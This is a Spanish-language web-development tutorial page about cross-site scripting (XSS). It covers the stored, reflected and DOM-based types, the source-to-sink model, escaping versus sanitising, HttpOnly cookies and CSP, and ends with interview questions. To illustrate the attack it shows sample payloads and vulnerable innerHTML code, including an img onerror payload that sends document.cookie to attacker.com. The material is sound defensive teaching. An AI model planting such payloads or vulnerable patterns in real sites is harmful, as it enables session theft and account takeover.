<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Attacks | FullStack</title>
    <link rel="stylesheet" href="../../../assets/css/styles.css">
</head>
<body>
    <div class="container">
        <aside id="sidebar" class="sidebar"></aside>
        <main class="main-content">
            <section id="section-xss">
                <h1>ğŸ‘¨ğŸ½â€ğŸ’» 5.2 Security: XSS Attacks (Complete Tutorial for Developers)</h1>
                <p><strong>CÃ³mo Entender, Detectar y Prevenir Ataques de Cross-Site Scripting</strong></p>

                <h2>0ï¸âƒ£ Â¿QuÃ© Es XSS Realmente?</h2>

                <p>XSS ocurre cuando datos controlados por un usuario terminan ejecutÃ¡ndose como JavaScript en el navegador de otro usuario.</p>

                <ul>
                    <li>ğŸ‘‰ No es un ataque al servidor</li>
                    <li>ğŸ‘‰ Es un ataque al navegador de la vÃ­ctima</li>
                    <li>ğŸ‘‰ El cÃ³digo malicioso se ejecuta dentro del contexto de tu dominio</li>
                </ul>

                <p><strong>Eso significa que el script malicioso puede:</strong></p>

                <ul>
                    <li>Hacer peticiones autenticadas en nombre del usuario</li>
                    <li>Leer informaciÃ³n del DOM</li>
                    <li>Robar tokens si estÃ¡n en localStorage</li>
                    <li>Ejecutar acciones como transferencias, cambios de email, etc.</li>
                    <li>Inyectar phishing dentro de tu propia app</li>
                </ul>

                <h2>1ï¸âƒ£ Â¿Por QuÃ© Es Tan Peligroso?</h2>

                <p>Porque el navegador confÃ­a en cualquier JavaScript que venga del mismo origen (origin).</p>

                <p>Si el atacante consigue ejecutar cÃ³digo en tu dominio:</p>

                <pre><code>https://tubanco.com</code></pre>

                <p>El navegador lo trata como si fuera cÃ³digo legÃ­timo de tu aplicaciÃ³n.</p>

                <h2>2ï¸âƒ£ Tipos De XSS (Muy Importante)</h2>

                <h3>ğŸŸ¢ 1. Stored XSS (Persistente)</h3>

                <p>El payload se guarda en base de datos.</p>

                <p><strong>Flujo del ataque:</strong></p>

                <ol>
                    <li>El atacante envÃ­a un comentario con JS malicioso</li>
                    <li>El backend lo guarda en la DB</li>
                    <li>Otro usuario visita la pÃ¡gina</li>
                    <li>El frontend renderiza ese contenido como HTML</li>
                    <li>El navegador ejecuta el script</li>
                </ol>

                <p><strong>Ejemplo clÃ¡sico:</strong></p>

                <pre><code>&lt;img src="x" onerror="alert('Hacked')"&gt;</code></pre>

                <h3>ğŸŸ¡ 2. Reflected XSS</h3>

                <p>El payload viene en la URL y el servidor lo devuelve directamente en la respuesta.</p>

                <p><strong>Ejemplo vulnerable:</strong></p>

                <pre><code>res.send(`&lt;h1&gt;Search: ${req.query.q}&lt;/h1&gt;`);</code></pre>

                <p>Si alguien visita:</p>

                <pre><code>https://app.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

                <p>Se ejecuta.</p>

                <h3>ğŸ”µ 3. DOM-based XSS</h3>

                <p>No depende del backend. El frontend manipula datos inseguros.</p>

                <p><strong>CÃ³digo vulnerable:</strong></p>

                <pre><code>output.innerHTML = location.hash.slice(1);</code></pre>

                <p>Si el usuario abre:</p>

                <pre><code>https://app.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>

                <p>Boom ğŸ’¥</p>

                <h2>3ï¸âƒ£ El Modelo Mental Correcto: SOURCE â†’ SINK</h2>

                <p>Un desarrollador senior siempre piensa asÃ­:</p>

                <h3>ğŸ”¹ SOURCE</h3>

                <p><strong>Â¿De dÃ³nde viene el dato?</strong></p>

                <ul>
                    <li>Input del usuario</li>
                    <li>Query params</li>
                    <li>Hash</li>
                    <li>Base de datos</li>
                    <li>APIs externas</li>
                    <li>localStorage</li>
                </ul>

                <p><strong>ğŸ‘‰ Todo eso es NO confiable.</strong></p>

                <h3>ğŸ”¹ SINK</h3>

                <p><strong>Â¿DÃ³nde lo estamos insertando?</strong></p>

                <p><strong>Sinks peligrosos:</strong></p>

                <ul>
                    <li>innerHTML</li>
                    <li>dangerouslySetInnerHTML</li>
                    <li>insertAdjacentHTML</li>
                    <li>document.write</li>
                    <li>eval()</li>
                    <li>new Function()</li>
                    <li>setTimeout("string")</li>
                </ul>

                <p><strong>El problema no es el input.</strong></p>
                <p><strong>El problema es interpretarlo como HTML/JS.</strong></p>

                <h2>4ï¸âƒ£ Demo PrÃ¡ctica (Stored XSS)</h2>

                <h3>âŒ CÃ³digo Vulnerable</h3>

                <pre><code>fetch("/api/comments")
  .then(res => res.json())
  .then(comments => {
    comments.forEach(comment => {
      const div = document.createElement("div");
      div.innerHTML = comment.text; // ğŸš¨ peligro
      container.appendChild(div);
    });
  });</code></pre>

                <p>Si alguien guardÃ³ esto en DB:</p>

                <pre><code>&lt;img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;</code></pre>

                <p>Se ejecutarÃ¡ cuando cualquier usuario abra la pÃ¡gina.</p>

                <h2>5ï¸âƒ£ La SoluciÃ³n Correcta</h2>

                <h3>âœ… OpciÃ³n 1 (Recomendada): Renderizar Como Texto</h3>

                <pre><code>div.textContent = comment.text;</code></pre>

                <p>El navegador ya no interpreta HTML.</p>

                <h3>âœ… En React (Seguro Por Defecto)</h3>

                <pre><code>&lt;p&gt;{comment}&lt;/p&gt;</code></pre>

                <p>React escapa automÃ¡ticamente.</p>

                <h3>âŒ En React (Peligroso)</h3>

                <pre><code>&lt;div dangerouslySetInnerHTML={{ __html: comment }} /&gt;</code></pre>

                <p>Solo usar si:</p>

                <ul>
                    <li>Necesitas HTML real</li>
                    <li>Has sanitizado antes</li>
                </ul>

                <h2>6ï¸âƒ£ Escapar vs Sanitizar (Concepto Clave)</h2>

                <h3>ğŸ”¹ Escapar (Encoding)</h3>

                <p>Convierte &lt;script&gt; en texto literal.</p>

                <ul>
                    <li>âœ”ï¸ Es la opciÃ³n mÃ¡s segura</li>
                    <li>âœ”ï¸ Es lo que React hace por defecto</li>
                </ul>

                <h3>ğŸ”¹ Sanitizar</h3>

                <p>Permites algunos tags y eliminas otros.</p>

                <p><strong>Ejemplo:</strong></p>

                <ul>
                    <li>Permitir &lt;b&gt;, &lt;i&gt;, &lt;a&gt;</li>
                    <li>Eliminar &lt;script&gt;, onload, onclick, javascript: etc.</li>
                </ul>

                <p><strong>âš ï¸ Solo si necesitas HTML rico.</strong></p>

                <p><strong>Regla senior:</strong></p>

                <p>Nunca aceptes HTML si no lo necesitas.</p>

                <h2>7ï¸âƒ£ Defense In Depth (Capas De ProtecciÃ³n)</h2>

                <p>Un senior nunca depende de una sola defensa.</p>

                <h3>ğŸ›¡ 1. Cookies HttpOnly</h3>

                <p>Impide que JS acceda a cookies de sesiÃ³n.</p>

                <pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>

                <p>Si hay XSS, no pueden hacer:</p>

                <pre><code>document.cookie</code></pre>

                <h3>ğŸ›¡ 2. Content Security Policy (CSP)</h3>

                <p><strong>Ejemplo:</strong></p>

                <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>

                <p>Bloquea scripts inline.</p>

                <h3>ğŸ›¡ 3. No Usar LocalStorage Para Tokens Sensibles</h3>

                <p>Si hay XSS:</p>

                <ul>
                    <li>LocalStorage es accesible</li>
                    <li>Cookies HttpOnly no</li>
                </ul>

                <h3>ğŸ›¡ 4. ValidaciÃ³n En Backend</h3>

                <p>Aunque el frontend escape, el backend debe validar.</p>

                <h2>8ï¸âƒ£ Checklist Profesional Anti-XSS</h2>

                <p>Cuando revisas una app:</p>

                <ul>
                    <li>âœ… Â¿Hay innerHTML?</li>
                    <li>âœ… Â¿Hay dangerouslySetInnerHTML?</li>
                    <li>âœ… Â¿Se usan eval o new Function?</li>
                    <li>âœ… Â¿Se renderiza contenido de DB como HTML?</li>
                    <li>âœ… Â¿Tokens en LocalStorage?</li>
                    <li>âœ… Â¿Cookies HttpOnly?</li>
                    <li>âœ… Â¿CSP activada?</li>
                    <li>âœ… Â¿Tests con payloads maliciosos?</li>
                </ul>

                <h2>9ï¸âƒ£ Caso Real: Â¿QuÃ© Puede Hacer Un Atacante?</h2>

                <p>Imagina una app bancaria:</p>

                <pre><code>fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({
    amount: 5000,
    to: 'attacker-account'
  })
});</code></pre>

                <p>Si el usuario estÃ¡ autenticado,</p>
                <p>el navegador enviarÃ¡ automÃ¡ticamente las cookies de sesiÃ³n.</p>
                <p>El backend pensarÃ¡ que fue el usuario legÃ­timo.</p>

                <h2>ğŸ”Ÿ Resumen Para Que Te Lo Grabes</h2>

                <p><strong>XSS no es:</strong></p>

                <p>"Alguien hackea el servidor"</p>

                <p><strong>Es:</strong></p>

                <p>"Alguien hace que el navegador de la vÃ­ctima ejecute cÃ³digo malicioso bajo tu dominio"</p>

                <p><strong>Y eso es extremadamente poderoso.</strong></p>

                <h2>1ï¸âƒ£1ï¸âƒ£ Preguntas TÃ­picas De Entrevista (Con Respuestas)</h2>

                <h3>â“ Â¿QuÃ© es XSS?</h3>

                <p>Es la ejecuciÃ³n de cÃ³digo JavaScript malicioso en el navegador de la vÃ­ctima debido a una incorrecta validaciÃ³n o renderizado de datos no confiables.</p>

                <h3>â“ Diferencia Entre Stored y Reflected XSS</h3>

                <p>Stored se guarda en la base de datos.<br>
                Reflected viene en la request y se devuelve inmediatamente.</p>

                <h3>â“ Â¿Por QuÃ© React Es MÃ¡s Seguro Por Defecto?</h3>

                <p>Porque escapa automÃ¡ticamente el contenido interpolado.</p>

                <h3>â“ Â¿Por QuÃ© LocalStorage Es Peligroso Frente a XSS?</h3>

                <p>Porque cualquier script puede leerlo.</p>

                <h3>â“ Â¿CÃ³mo MitigarÃ­as XSS En Una App Real?</h3>

                <p>No usar innerHTML<br>
                Escapar output<br>
                Sanitizar si necesito HTML<br>
                Cookies HttpOnly<br>
                CSP<br>
                ValidaciÃ³n backend</p>

                <h2>1ï¸âƒ£2ï¸âƒ£ Mentalidad Senior</h2>

                <ul>
                    <li>Nunca confÃ­es en datos externos</li>
                    <li>Nunca interpretes strings como cÃ³digo</li>
                    <li>Siempre piensa en tÃ©rminos de: SOURCE â†’ TRANSFORMACIÃ“N â†’ SINK</li>
                    <li>Si algo puede llegar al DOM como HTML, asume que puede convertirse en ejecuciÃ³n de cÃ³digo</li>
                    <li>Si quieres mantener usuarios seguros, no uses innerHTML con datos no confiables</li>
                </ul>

                <h2>1ï¸âƒ£3ï¸âƒ£ Una Frase Para Recordar</h2>

                <p><strong>\"XSS es cuando el navegador ejecuta cÃ³digo no confiable como si fuera legÃ­timo. Nunca interpretes datos externos como HTML o JavaScript. Escapa siempre, sanitiza raramente.\"</strong></p>

                <h2>1ï¸âƒ£4ï¸âƒ£ Referencias y Recursos</h2>

                <p><strong>Para profundizar mÃ¡s:</strong></p>

                <ul>
                    <li><a href="https://chatgpt.com/g/g-p-69925f6597e88191b8bcb93447c5bb78-dragos/c/6994efaf-8c3c-8394-afaa-0fcb83244f2b" target="_blank">Dragos - Advanced XSS & Web Security Patterns</a></li>
                </ul>

                <div class="navigation-buttons">
                    <button class="btn btn-secondary" onclick="window.location.href='11-sql-injection.html'">â† Anterior</button>
                    <button class="btn btn-primary" onclick="window.location.href='../../../index.html'">Volver al Inicio â†’</button>
                </div>
            </section>
        </main>
    </div>

    <script src="../../../assets/js/app.js"></script>
</body>
</html>
